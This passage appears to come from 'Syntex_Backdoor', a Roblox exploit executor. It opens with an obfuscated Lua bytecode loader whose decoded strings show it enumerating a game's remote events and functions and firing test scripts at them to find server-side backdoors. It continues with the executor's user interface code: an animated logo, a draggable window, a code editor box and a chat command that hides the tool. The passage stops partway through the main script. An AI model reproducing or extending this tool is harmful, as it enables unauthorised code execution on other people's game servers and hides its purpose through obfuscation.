-(728 + 939) ;local v476;local v477;while true do if (v475==(35 -25)) then v76[v477](v13(v76,v477 + (1 -0) ,v78[6 -(3 + 0) ]));v70=v70 + 1 ;v78=v66[v70];v76[v78[1070 -(138 + 930) ]]=v78[1039 -(1007 + 29) ];v70=v70 + 1 + 0 ;v78=v66[v70];v70=v78[3];break;end if (v475==(4 + 1)) then v477=v78[1 + 1 ];v76[v477]=v76[v477](v76[v477 + 1 + 0 ]);v70=v70 + (4 -3) ;v78=v66[v70];v76[v78[2]][v76[v78[1769 -(459 + 1307) ]]]=v76[v78[1874 -((1158 -684) + 1396) ]];v70=v70 + (1 -0) ;v78=v66[v70];v475=6 + 0 ;end if ((2272>=1107) and (v475==(1 + 7))) then v78=v66[v70];v76[v78[2]]=v59[v78[(37 -29) -5 ]];v70=v70 + 1 + 0 + 0 ;v78=v66[v70];v76[v78[6 -4 ]]=v76[v78[(823 -(340 + 471)) -9 ]][v78[595 -((1415 -853) + 29) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v475=1428 -(374 + 1045) ;end if ((911>=521) and (v475==(4 + 0))) then v78=v66[v70];v477=v78[5 -3 ];v476=v76[v78[641 -(448 + 190) ]];v76[v477 + 1 + 0 ]=v476;v76[v477]=v476[v78[4]];v70=v70 + 1 + 0 ;v78=v66[v70];v475=4 + 1 ;end if (v475==(0 -0)) then v476=nil;v477=nil;v76[v78[5 -3 ]]=v59[v78[(2086 -(276 + 313)) -(1307 + 187) ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[7 -5 ]]=v76[v78[3]][v78[4]];v70=v70 + (2 -(1 + 0)) ;v475=2 -1 ;end if (((291 + 395) -(232 + 451))==v475) then v70=v70 + 1 + 0 + 0 ;v78=v66[v70];v76[v78[2 + 0 ]]=v59[v78[567 -(510 + 54) ]];v70=v70 + ((1973 -(495 + 1477)) -(0 -0)) ;v78=v66[v70];v76[v78[38 -(13 + 23) ]]=v76[v78[5 -2 ]][v78[4]];v70=v70 + (1 -0) ;v475=7 -(2 + 1) ;end if ((3804>3392) and (v475==((1497 -(342 + 61)) -(830 + 258)))) then v76[v78[6 -4 ]]=v59[v78[2 + 1 + 0 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[1443 -(860 + 581) ]]=v76[v78[10 -7 ]][v78[4 + 0 ]];v70=v70 + ((407 -(4 + 161)) -(146 + 91 + 4)) ;v78=v66[v70];v76[v78[2]][v76[v78[3]]]=v76[v78[9 -5 ]];v475=17 -10 ;end if (v475==9) then v76[v78[3 -1 ]]=v59[v78[3]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2 + 0 ]]=v76[v78[2 + 1 ]][v78[15 -11 ]];v70=v70 + 1 + 0 ;v78=v66[v70];v477=v78[2 + 0 ];v475=1436 -(85 + 1341) ;end if ((3 -1)==v475) then v76[v78[6 -4 ]]=v76[v78[(20 -12) -5 ]][v78[376 -(45 + 327) ]];v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[(1001 -(322 + 175)) -(444 + (621 -(173 + 390))) ]]=v76[v78[2 + 1 ]][v78[1 + 3 ]];v70=v70 + 1 + 0 + 0 ;v78=v66[v70];v76[v78[5 -(317 -(203 + 111)) ]][v76[v78[(108 + 1627) -(64 + 1177 + 491) ]]]=v76[v78[1977 -(1227 + 746) ]];v475=9 -6 ;end if ((v475==(1 -0)) or (935<=162)) then v78=v66[v70];v76[v78[496 -(415 + 79) ]][v76[v78[3]]]=v76[v78[(2 -1) + 3 ]];v70=v70 + (492 -(129 + 13 + (1055 -(57 + 649)))) ;v78=v66[v70];v76[v78[1 + 1 ]]=v59[v78[3 -0 ]];v70=v70 + (385 -(328 + 56)) + 0 ;v78=v66[v70];v475=2 + 0 ;end if (7==v475) then v70=v70 + (2 -1) ;v78=v66[v70];v59[v78[1867 -(1710 + 154) ]]=v76[v78[320 -(200 + 118) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v76[v78[2]]=v76[v78[(2 + 3) -2 ]];v70=v70 + 1 ;v475=11 -3 ;end end elseif ((414<1183) and (v79==(64 + 8))) then local v660;v76[v78[2 + 0 ]]=v59[v78[3]];v70=v70 + 1 + (512 -(433 + 79)) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[6 -3 ]][v78[1254 -(363 + 887) ]];v70=v70 + 1 ;v78=v66[v70];v76[v78[2 -0 ]]=v59[v78[3]];v70=v70 + (4 -3) ;v78=v66[v70];v76[v78[1 + 1 ]]=v76[v78[3]][v78[9 -(1 + 4) ]];v70=v70 + 1 + 0 ;v78=v66[v70];v660=v78[1666 -(674 + 990) ];v76[v660](v13(v76,v660 + 1 + 0 ,v78[2 + 1 ]));v70=v70 + (1 -0) ;v78=v66[v70];v76[v78[2]]=v78[1058 -(410 + 97 + 548) ]~=(837 -(289 + 548)) ;v70=v70 + ((6116 -4297) -((3882 -3061) + 997)) ;v78=v66[v70];for v833=v78[257 -(195 + 60) ],v78[1 + 2 ] do v76[v833]=nil;end v70=v70 + (1502 -(251 + 1250)) ;v78=v66[v70];v660=v78[2];do return v76[v660],v76[v660 + (2 -1) ];end v70=v70 + 1 + 0 ;v78=v66[v70];v70=v78[1035 -(809 + 223) ];else v70=v78[3 -0 ];end elseif (v79<=(225 -150)) then if ((4098>766) and (v79==(244 -170))) then local v478=v78[2 + 0 ];local v479={v76[v478](v76[v478 + (618 -(14 + 603)) ])};local v480=129 -(118 + 11) ;for v511=v478,v78[1 + 3 ] do v480=v480 + 1 + 0 ;v76[v511]=v479[v480];end else v59[v78[8 -5 ]]=v76[v78[2]];end elseif (v79<=(1025 -(551 + 291 + 107))) then local v483=v78[2 + 0 ];local v484=v76[v483];local v485=v76[v483 + 2 ];if (v485>(0 + 0)) then if ((v484>v76[v483 + 1 + 0 + 0 ]) or (3904<=98)) then v70=v78[3];else v76[v483 + (11 -8) ]=v484;end elseif (v484<v76[v483 + 1 ]) then v70=v78[6 -3 ];else v76[v483 + 1 + 2 ]=v484;end elseif ((v79==77) or (4255<=549)) then local v673=v78[7 -5 ];do return v13(v76,v673,v673 + v78[1 + (1038 -(562 + 474)) ] );end else v76[v78[91 -(40 + 49) ]]=v78[11 -8 ] + v76[v78[4]] ;end v70=v70 + (491 -(99 + 391)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!6C3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274025Q00C05240030B3Q000E3404B40DEE0423393F1D03083Q00555C5169DB798B41026Q00524003123Q000C5777D9DD05F32B4A32DC9E06E32F5723DD03073Q0086423857B8BE74025Q00405140030E3Q0098CD00C4D1A6F1F4A4CB19C2CAAD03083Q0081CAA86DABA5C3B7026Q005140030B3Q008A27731130FECAAE27700A03073Q008FD8421E7E449B025Q00C0504003243Q0062A4D17626CD4AE45CAEDD7D3BC60DA140BEDD773DC259AD41A5907F20C758A84BE59E3C03083Q00C42ECBB0124FA32D025Q0080504003043Q008772151403063Q0051CE3C535B4F025Q0040504003193Q0028E9414B7A00EB41457215EE47513302E8454F7F04F34D1F3203053Q00136187283F026Q00504003043Q0094F7066303043Q002CDDB940025Q00804F4003123Q0067DCB94812734C93BB43166D47D6AC495B3C03063Q001D2BB3D82C7B026Q004F4003043Q00A862C55603053Q00CFE12C8319025Q00804E40031E3Q0022E1B8CEDA718516B5ABD9C3779F14B5BCD2DB758E03F4ADD5C176C55FBB03073Q00EB7195D9BCAE18026Q004E4003043Q00AED4E9A903043Q00E6E79AAF025Q00804C4003043Q002277706403063Q00E36B39362B9D026Q004640030B3Q00D67465E9C07173FBD7726503043Q00A885363A026Q00444003053Q00D87FF6B55403053Q00139C3AB4E0025Q00804240030B3Q007C75E04F4CE06B66E84E4C03063Q00852E108D2038026Q003F40031C3Q00E03BCDB952CECD288EB74EC4C12FDABB59CF8239C1BC50C8D037CBB603063Q00A1A25AAED236026Q003E4003053Q001CCAE0FF9503083Q002C5D86A5ADC11EDE026Q00384003143Q00F23A73AF79BA3ED83A3CBF38BD30C82Q30B97DBD03073Q0055BC5553CD18D9026Q00374003043Q009FC5082B03063Q0024D68B4E6427026Q00364003103Q00EDADAAD3CBA3A6CA8FAAA6CDC1A8E99903043Q00B8AFCCC9026Q00354003073Q00FCD5AF267A75D703083Q001CAF80EC653F2684026Q00344003043Q00B2DD120203063Q00A1E6B47F67B3026Q00324003043Q008F4D108003053Q00E4DF2C64E8026Q00304003053Q00FE1CF16BA203073Q00CDBD709018D170026Q002E4003063Q008AB5A1B21EE803063Q008DD8D0CCDD6A026Q002A4003143Q001FCE13C6E78020DF17C9A3986CDF07C6A98822CA03063Q00E14CAD72A8C7026Q002640031B3Q0011403E33BB39423E3DBB36497734B13940772ABD3C5B3B22FC760003053Q00D2582E5747026Q00244003043Q0026ACD1D003073Q00A36FE2979F4971026Q001040031C3Q0017991A31A3E379D71F981C33C2FD1BED11EA034BCC9058ED11EA7D1D03083Q009E4CCA586EE2A63E026Q00F03F030B3Q00F3E91FC2D534A0FFD2FE0E03083Q0089BB9D6BB28651D203043Q0067616D65030A3Q004765745365727669636503063Q00412Q7461636803073Q0045786563757465030A3Q004765744C61737452657300CC4Q00437Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B000100010004493Q000B000100120D000400063Q002Q2000050004000700120D000600083Q002Q2000060006000900120D000700083Q002Q2000070007000A00061400083Q000100062Q00273Q00074Q00273Q00014Q00273Q00054Q00273Q00024Q00273Q00034Q00273Q00064Q0005000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B00094Q000900083Q00122Q000A000F3Q00122Q000B00106Q0009000B000200104Q000E00094Q000900083Q00122Q000A00123Q00122Q000B00136Q0009000B000200104Q001100094Q000900083Q00122Q000A00153Q00122Q000B00166Q0009000B000200104Q001400094Q000900083Q00122Q000A00183Q00122Q000B00196Q0009000B000200104Q001700094Q000900083Q00122Q000A001B3Q00122Q000B001C6Q0009000B000200104Q001A00094Q000900083Q00122Q000A001E3Q00122Q000B001F6Q0009000B000200104Q001D00094Q000900083Q00122Q000A00213Q00122Q000B00226Q0009000B000200104Q002000094Q000900083Q00122Q000A00243Q00122Q000B00256Q0009000B000200104Q002300094Q000900083Q00122Q000A00273Q00122Q000B00286Q0009000B000200104Q002600094Q000900083Q00122Q000A002A3Q00122Q000B002B6Q0009000B000200104Q002900094Q000900083Q00122Q000A002D3Q00122Q000B002E6Q0009000B000200104Q002C00094Q000900083Q00122Q000A00303Q00122Q000B00316Q0009000B000200104Q002F00094Q000900083Q00122Q000A00333Q00122Q000B00346Q0009000B000200104Q003200094Q000900083Q00122Q000A00363Q00122Q000B00376Q0009000B000200104Q003500094Q000900083Q00122Q000A00393Q00122Q000B003A6Q0009000B000200104Q003800092Q0027000900083Q00122B000A003C3Q00122Q000B003D6Q0009000B000200104Q003B00094Q000900083Q00122Q000A003F3Q00122Q000B00406Q0009000B000200104Q003E00094Q000900083Q00122Q000A00423Q00122Q000B00436Q0009000B000200104Q004100094Q000900083Q00122Q000A00453Q00122Q000B00466Q0009000B000200104Q004400094Q000900083Q00122Q000A00483Q00122Q000B00496Q0009000B000200104Q004700094Q000900083Q00122Q000A004B3Q00122Q000B004C6Q0009000B000200104Q004A00094Q000900083Q00122Q000A004E3Q00122Q000B004F6Q0009000B000200104Q004D00094Q000900083Q00122Q000A00513Q00122Q000B00526Q0009000B000200104Q005000094Q000900083Q00122Q000A00543Q00122Q000B00556Q0009000B000200104Q005300094Q000900083Q00122Q000A00573Q00122Q000B00586Q0009000B000200104Q005600094Q000900083Q00122Q000A005A3Q00122Q000B005B6Q0009000B000200104Q005900094Q000900083Q00122Q000A005D3Q00122Q000B005E6Q0009000B000200104Q005C00094Q000900083Q00122Q000A00603Q00122Q000B00616Q0009000B000200104Q005F00094Q000900083Q00122Q000A00633Q00122Q000B00646Q0009000B000200104Q006200094Q000900083Q00122Q000A00663Q00122Q000B00676Q0009000B000200104Q006500094Q00095Q00122Q000A00683Q00202Q000A000A006900202Q000C3Q00654Q000A000C00024Q000B6Q000B000C000C3Q000614000D0001000100012Q00277Q000614000E0002000100052Q00278Q00273Q000D4Q00273Q000C4Q00273Q000B4Q00273Q000A3Q00100A0009006A000E000614000E0003000100022Q00273Q000C4Q00277Q00100A0009006B000E000614000E0004000100012Q00273Q000C3Q00100A0009006C000E2Q0004000900024Q004600096Q002C3Q00013Q00053Q00023Q00026Q00F03F026Q00704002264Q003F00025Q00122Q000300016Q00045Q00122Q000500013Q00042Q0003002100012Q000100076Q0019000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00202Q000F000600014Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0001000F4Q001000016Q00100006001000102Q00100001001000202Q0010001000014Q000D00106Q000C8Q000A3Q000200202Q000A000A00024Q0009000A6Q00073Q00010004420003000500012Q0001000300054Q0027000400024Q001F000300044Q000F00036Q002C3Q00017Q00033Q00028Q0003023Q006F7303053Q00636C6F636B00123Q0012413Q00014Q000B000100013Q0026243Q0002000100010004493Q00020001001241000200013Q00262400020005000100010004493Q0005000100120D000300023Q002Q200003000300032Q001D0003000100022Q0027000100033Q00061400033Q000100022Q00018Q00273Q00014Q0004000300023Q0004493Q000500010004493Q000200012Q002C3Q00013Q00013Q00063Q0003043Q007761726E03063Q00737472696E6703063Q00666F726D6174026Q00104003023Q006F7303053Q00636C6F636B020F3Q001235000200013Q00122Q000300023Q00202Q0003000300034Q00045Q00202Q0004000400044Q00055Q00122Q000600053Q00202Q0006000600064Q0006000100024Q000700016Q0006000600074Q000700016Q000300076Q00023Q00016Q00017Q003B3Q00028Q00026Q002040026Q00084003023Q006F7303053Q00636C6F636B026Q00F03F03043Q007461736B03043Q0077616974026Q002240026Q001840026Q001C40026Q002440026Q002640027Q0040026Q002A4003053Q007461626C6503053Q00636C656172026Q002E40026Q00304003093Q00436C612Q734E616D65026Q003240030B3Q0047657446752Q6C4E616D65026Q003440026Q003540026Q003640026Q003740026Q00384003093Q00776F726B7370616365030F3Q0044657363656E64616E74412Q64656403073Q00436F2Q6E65637403063Q0069706169727303053Q00737061776E026Q00144003043Q0067616D6503113Q005265706C69636174656453746F72616765030F3Q005265706C696361746564466972737403093Q00576F726B737061636503073Q00506C6179657273030A3Q0053746172746572477569030D3Q0053746172746572506C6179657203053Q005465616D73030C3Q00536F756E6453657276696365030F3Q00546578744368617453657276696365030E3Q0047657444657363656E64616E7473025Q00804C40032B3Q0052656D6F746520656E756D65726174696F6E20636F6D706C657465642021202825642072656D6F7465732903063Q00666F726D6174026Q004E40025Q00804E40026Q001040026Q004F40025Q00804F40026Q005040025Q00405040025Q00805040025Q00C05040026Q0051402Q01025Q00405140003D012Q0012413Q00014Q000B0001000D3Q0026243Q001E000100020004493Q001E0001001241000E00013Q002624000E000D000100010004493Q000D0001001241000C00033Q001234000F00043Q00202Q000F000F00054Q000F000100024Q000D000F3Q00122Q000E00063Q002624000E0005000100060004493Q0005000100060E0008001B000100010004493Q001B000100120D000F00043Q002Q20000F000F00052Q001D000F000100022Q003D000F000F000D00061E000F001B0001000C0004493Q001B000100120D000F00073Q002Q20000F000F00082Q0007000F000100010004493Q000F00010012413Q00093Q0004493Q001E00010004493Q000500010026243Q002C0001000A0004493Q002C0001001241000E00013Q002624000E0026000100010004493Q002600012Q002800086Q000B000900093Q001241000E00063Q000E2E000600210001000E0004493Q002100012Q000B000A000A3Q0012413Q000B3Q0004493Q002C00010004493Q002100010026243Q0044000100060004493Q00440001001241000E00013Q002624000E0039000100060004493Q003900012Q0027000F00014Q001800105Q00202Q00100010000C4Q00115Q00202Q00110011000D4Q000F0011000100124Q000E3Q00044Q00440001002624000E002F000100010004493Q002F00012Q0001000F00014Q0002000F000100024Q0001000F3Q00122Q000F00043Q00202Q000F000F00054Q000F000100024Q0002000F3Q00122Q000E00063Q00044Q002F00010026243Q005A000100010004493Q005A0001001241000E00013Q002624000E004D000100060004493Q004D00012Q000B000F000F4Q004B000F00023Q0012413Q00063Q0004493Q005A0001002624000E0047000100010004493Q004700012Q0001000F00033Q000625000F005600013Q0004493Q005600012Q0028000F6Q000100105Q002Q2000100010000F4Q000F00034Q0028000F00014Q004B000F00033Q001241000E00063Q0004493Q004700010026243Q009B000100090004493Q009B00012Q0028000E6Q0006000E00033Q00122Q000E00103Q00202Q000E000E00114Q000F00076Q000E0002000100062Q0009009100013Q0004493Q00910001001241000E00014Q000B000F000F3Q002624000E0066000100010004493Q00660001001241000F00013Q001241001000013Q000E2E0001006A000100100004493Q006A0001000E2E000600710001000F0004493Q007100012Q0028001100014Q0001001200026Q001100033Q002624000F0069000100010004493Q006900012Q001C00113Q00042Q004700125Q00202Q0012001200124Q0011001200094Q00125Q00202Q00120012001300202Q0013000900144Q0011001200134Q00125Q00202Q00120012001500202Q0013000900164Q0013000200024Q0011001200134Q00125Q00202Q0012001200174Q00110012000A4Q001100026Q001100016Q00125Q00202Q0012001200184Q00135Q00202Q0013001300194Q00110013000100122Q000F00063Q00044Q006900010004493Q006A00010004493Q006900010004493Q003C2Q010004493Q006600010004493Q003C2Q012Q0027000E00014Q0048000F5Q00202Q000F000F001A4Q00105Q00202Q00100010001B4Q000E001000014Q000E8Q000F000F6Q000E00033Q00044Q003C2Q010026243Q00C60001000B0004493Q00C60001001241000E00013Q002624000E00B0000100010004493Q00B000012Q000B000B000B3Q00120D000F001C3Q002Q20000F000F001D002038000F000F001E00061400113Q000100082Q00273Q00074Q00273Q00084Q00273Q000A4Q00273Q00024Q00273Q00094Q00273Q00014Q00018Q00273Q000B4Q002A000F001100022Q0027000B000F3Q001241000E00063Q002624000E009E000100060004493Q009E000100120D000F001F4Q0027001000034Q004A000F000200110004493Q00C1000100120D001400073Q002Q2000140014002000061400150001000100062Q00273Q00134Q00018Q00273Q00074Q00273Q00014Q00273Q00084Q00013Q00044Q000C0014000200012Q004600125Q000622000F00B6000100020004493Q00B600010012413Q00023Q0004493Q00C600010004493Q009E00010026243Q00FA000100210004493Q00FA000100120D000E001F4Q003B000F00093Q00122Q001000223Q00202Q00100010002300122Q001100223Q00202Q00110011002400122Q001200223Q00202Q00120012002500122Q001300223Q00202Q00130013002600122Q001400223Q00202Q00140014002700122Q001500223Q00202Q00150015002800122Q001600223Q00202Q00160016002900122Q001700223Q00202Q00170017002A00122Q001800223Q00202Q00180018002B4Q000F000900012Q004A000E000200100004493Q00ED000100120D0013001F3Q00203800140012002C2Q0021001400154Q001500133Q00150004493Q00EB0001002Q200018001700142Q0003001800050018000625001800EB00013Q0004493Q00EB00012Q0027001800064Q0027001900174Q000C001800020001000622001300E4000100020004493Q00E40001000622000E00DF000100020004493Q00DF00012Q0027000E00014Q0033000F5Q00202Q000F000F002D00122Q0010002E3Q00202Q00100010002F4Q001200036Q001000126Q000E3Q00014Q000E8Q0007000E3Q00124Q000A3Q0026243Q00072Q0100030004493Q00072Q012Q0027000E00014Q0023000F5Q00202Q000F000F00304Q00105Q00202Q0010001000314Q000E001000014Q000E8Q0003000E6Q000E8Q0004000E3Q00124Q00323Q0026243Q00242Q01000E0004493Q00242Q01001241000E00013Q002624000E00142Q0100060004493Q00142Q012Q0027000F00014Q001800105Q00202Q0010001000334Q00115Q00202Q0011001100344Q000F0011000100124Q00033Q00044Q00242Q01002624000E000A2Q0100010004493Q000A2Q012Q0027000F00014Q004000105Q00202Q0010001000354Q00115Q00202Q0011001100364Q000F001100014Q000F00016Q00105Q00202Q0010001000374Q00115Q00202Q0011001100384Q000F0011000100122Q000E00063Q00044Q000A2Q010026243Q0002000100320004493Q00020001001241000E00013Q002624000E002E2Q0100060004493Q002E2Q0100061400060002000100022Q00273Q00044Q00273Q00033Q0012413Q00213Q0004493Q00020001002624000E00272Q0100010004493Q00272Q012Q001C000F3Q00022Q001300105Q00202Q00100010003900202Q000F0010003A4Q00105Q00202Q00100010003B00202Q000F0010003A4Q0005000F6Q000600063Q00122Q000E00063Q00044Q00272Q010004493Q000200012Q002C3Q00013Q00033Q000A3Q00028Q0003043Q004E616D65026Q00F03F03023Q006F7303053Q00636C6F636B03073Q0044657374726F79027Q0040026Q003E40026Q003F40030A3Q00446973636F2Q6E656374012E3Q001241000100014Q000B000200023Q00262400010002000100010004493Q000200012Q000100035Q002Q2000043Q00022Q00030002000300040006250002002D00013Q0004493Q002D00012Q0001000300013Q00060E0003002D000100010004493Q002D0001001241000300013Q00262400030018000100030004493Q0018000100120D000400043Q00202F0004000400054Q0004000100024Q000500036Q0004000400054Q000400023Q00202Q00043Q00064Q00040002000100122Q000300073Q0026240003001E000100010004493Q001E00012Q0028000400014Q004B000400014Q004B000200043Q001241000300033Q0026240003000D000100070004493Q000D00012Q0001000400054Q002D000500063Q00202Q0005000500084Q000600063Q00202Q0006000600094Q0004000600014Q000400073Q00202Q00040004000A4Q00040002000100044Q002D00010004493Q000D00010004493Q002D00010004493Q000200012Q002C3Q00017Q000C3Q00028Q00026Q00F03F027Q004003283Q00496E7374616E63652E6E65772822466F6C646572222C20776F726B7370616365292E4E616D653D2203013Q002203053Q007063612Q6C026Q00444003263Q0053656E64696E6720746573742073637269707420746F2072656D6F74652027257327203Q2E03063Q00666F726D617403043Q004E616D65026Q004640030C3Q0047656E65726174654755494400383Q0012413Q00014Q000B000100033Q000E2E0001000700013Q0004493Q00070001001241000100014Q000B000200023Q0012413Q00023Q000E2E0002000200013Q0004493Q000200012Q000B000300033Q000E2E00030017000100010004493Q00170001001241000400044Q0027000500023Q001241000600054Q001A00030004000600120D000400063Q00061400053Q000100032Q00018Q00013Q00014Q00273Q00034Q000C0004000200010004493Q00370001000E2E00020026000100010004493Q002600012Q0001000400024Q001700058Q0004000200054Q000400036Q000500013Q00202Q00050005000700122Q000600083Q00202Q0006000600094Q00085Q00202Q00080008000A4Q000600086Q00043Q000100122Q000100033Q0026240001000A000100010004493Q000A00012Q0001000400043Q0006250004002C00013Q0004493Q002C00012Q002C3Q00014Q0001000400013Q00203E00040004000B4Q000500053Q00202Q00050005000C4Q00078Q0005000700024Q00020004000500122Q000100023Q00044Q000A00010004493Q003700010004493Q000200012Q002C3Q00013Q00013Q00043Q002Q033Q00497341025Q00804240030A3Q0046697265536572766572030C3Q00496E766F6B6553657276657200114Q00377Q00206Q00014Q000200013Q00202Q0002000200026Q0002000200064Q000C00013Q0004493Q000C00012Q00017Q0020385Q00032Q0001000200024Q001B3Q000200010004493Q001000012Q00017Q0020385Q00042Q0001000200024Q001B3Q000200012Q002C3Q00017Q00033Q00028Q002Q01026Q00F03F01174Q000100016Q0003000100013Q00060E00010016000100010004493Q00160001001241000100014Q000B000200023Q00262400010006000100010004493Q00060001001241000200013Q00262400020009000100010004493Q000900012Q000100035Q00203A00033Q00024Q000300016Q000400016Q000400043Q00202Q0004000400034Q000300043Q00044Q001600010004493Q000900010004493Q001600010004493Q000600012Q002C3Q00017Q00053Q00028Q00026Q00F03F03063Q0052656D6F7465026Q00524003053Q007063612Q6C011B3Q001241000100013Q00262400010005000100020004493Q000500012Q0028000200014Q0004000200023Q00262400010001000100010004493Q000100012Q000100025Q0006250002000E00013Q0004493Q000E00012Q000100025Q002Q2000020002000300060E00020012000100010004493Q001200012Q002800026Q0001000300013Q002Q200003000300044Q000200033Q00120D000200053Q00061400033Q000100032Q00018Q00013Q00014Q00278Q000C000200020001001241000100023Q0004493Q000100012Q002C3Q00013Q00013Q00053Q0003063Q0052656D6F74652Q033Q00497341025Q00C05240030A3Q0046697265536572766572030C3Q00496E766F6B6553657276657200144Q00117Q00206Q000100206Q00024Q000200013Q00202Q0002000200036Q0002000200064Q000E00013Q0004493Q000E00012Q00017Q0020085Q000100206Q00044Q000200028Q0002000100044Q001300012Q00017Q002Q205Q00010020385Q00052Q0001000200024Q001B3Q000200012Q002C3Q00019Q003Q00034Q00018Q00043Q00024Q002C3Q00017Q00",v9(),...);
		end)(...)
	end;
};
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.LogoH
local function C_4()
	local script = G2L["4"];
	local Main = script.Parent.Parent.UI.LOGO
	local Main2 = Main.Main2
	local Orbit = Main.Orbit
	local Ring = Main.Ring

	local RS = game:GetService("RunService").Heartbeat
	local Tween = game:GetService("TweenService")
	local WaitTime = 0.25
	local LoadInfo = TweenInfo.new(WaitTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
	local FlashInfo = TweenInfo.new(WaitTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 1, true, 0)

	local hk = Main.AbsoluteSize.X / 2
	local MainSize = Main.AbsoluteSize.X
	local ls = Orbit.AbsoluteSize.X / 2
	local r = hk
	local theta = 0
	local step = (2 * math.pi) / 450
	local rotvel = 0.5

	local StepInstance = Instance.new("NumberValue")
	local RotInstance = Instance.new("NumberValue")

	StepInstance.Changed:Connect(function()
		step = StepInstance.Value
	end)

	RotInstance.Changed:Connect(function()
		rotvel = RotInstance.Value
	end)

	local Modes = {
		Tween:Create(Main2, LoadInfo, { ImageTransparency = 0.5 }),
		Tween:Create(Main2, LoadInfo, { ImageTransparency = 1 }),   
		Tween:Create(Main2, FlashInfo, { ImageTransparency = 0 }),
		Tween:Create(StepInstance, LoadInfo, { Value = (2 * math.pi) / 180 }),
		Tween:Create(StepInstance, LoadInfo, { Value = (2 * math.pi) / 450 }),
		Tween:Create(RotInstance, LoadInfo, { Value = 1 }),
		Tween:Create(RotInstance, LoadInfo, { Value = 0.35 }),
	}

	Modes[2].Completed:Connect(function()
		Modes[3]:Play()
	end)

	local function ScriptLoading()
		Modes[6]:Play()
		Modes[4]:Play()
		Modes[1]:Play()
	end

	local function ScriptDone()
		Modes[2]:Play()
		Modes[5]:Play()
		Modes[7]:Play()
	end

	spawn(function()
		local hi = Main
		hi:TweenPosition(UDim2.new(0.5, -50, 0.5, -50), Enum.EasingDirection.In)
		wait(3)
		hi:TweenPosition(UDim2.new(0, 30, 1, -126), Enum.EasingDirection.Out)

		game:GetService('Players').LocalPlayer.Chatted:Connect(function(agg)
			pcall(function()
				if agg == '/e hidemeh' then
					hi.Visible = not hi.Visible
				end
			end)
		end)
	end)

	script.olleH.Event:Connect(function(a)
		if a then 
			ScriptLoading() 
		else 
			ScriptDone() 
		end
	end)

	local fixedRingPosition = Ring.Position
	while RS:Wait() do
		theta = (theta + step) % (2 * math.pi)
		local x = (hk + r * math.cos(theta) - ls)
		local y = (hk + r * math.sin(theta) - ls)
		Orbit.Position = UDim2.new(x / MainSize, 0, y / MainSize, 0)

		Main.Rotation = (Main.Rotation + rotvel) % 360

		Ring.Position = fixedRingPosition
		Ring.Rotation = -Main.Rotation
	end
end;
task.spawn(C_4);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.hideExecutor
local function C_6()
	local script = G2L["6"];
	local UI = script.Parent.Parent.UI
	local fr = UI.LOGO.Ring.Frame
	local btn = UI.LOGO.Ring
	local mainContainer = UI.mainContainer

	if btn.Interactable == false then
		wait(4.5)
		mainContainer.Visible = true
		fr.Visible = true
		btn.Interactable = true
	end

	btn.MouseButton1Click:Connect(function()
		mainContainer.Visible = not mainContainer.Visible
	end)
end;
task.spawn(C_6);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.UIDragMainContainer
local function C_7()
	local script = G2L["7"];
	local UserInputService = game:GetService("UserInputService")

	local gui = script.Parent.Parent.UI.mainContainer

	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end

	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_7);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.clearIDE
local function C_8()
	local script = G2L["8"];
	local UI = script.Parent.Parent.UI
	local mainContainer = UI.mainContainer
	local Executor = mainContainer.Executor
	local ideContainer = Executor.ideContainer
	local ideScroll = ideContainer.ideScroll
	local tb = ideScroll.ide
	local clrBTN = ideContainer.buttons.erase

	clrBTN.MouseButton1Click:Connect(function() 
		tb.Text = ""
	end)
end;
task.spawn(C_8);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.hideIDE
local function C_9()
	local script = G2L["9"];
	local UI = script.Parent.Parent.UI
	local mainContainer = UI.mainContainer
	local Executor = mainContainer.Executor
	local ideContainer = Executor.ideContainer
	local hideBTN = ideContainer.buttons.hide
	local himg = hideBTN.ImageLabel

	hideBTN.MouseButton1Click:Connect(function()
		himg.Visible = not himg.Visible
	end)
end;
task.spawn(C_9);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.mainScripts.mainScript
local function C_a()
	local script = G2L["a"];
	--// VARIABLES \\--

	local SB_AEGISRD = require(script.Parent.Parent.Modules.SB_AegisRD)
	local UI = script.Parent.Parent.UI
	local mainContainer = UI.mainContainer
	local Executor = mainContainer.Executor
	local ideContainer = Executor.ideContainer
	local ideScroll = ideContainer.ideScroll
	local Cody = ideScroll.ide
